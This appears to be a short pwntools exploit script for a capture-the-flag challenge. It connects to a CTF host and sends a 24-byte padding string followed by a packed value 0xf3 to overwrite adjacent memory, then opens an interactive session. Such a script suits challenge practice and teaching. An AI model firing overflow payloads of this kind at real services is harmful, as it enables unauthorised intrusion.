#!/usr/bin/env python


from pwn import *
import subprocess
import sys
import time
import struct

HOST = "9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site"
PORT = 55000

#HOST = "127.0.0.1"
#PORT = 1390

# setting

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.log_level = 'INFO'

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    raw_input()

    payload = "B"*24

    payload += struct.pack("<I", 0xf3)
    r.sendafter("Welcome, give me you best shot\n", payload)


    r.interactive()
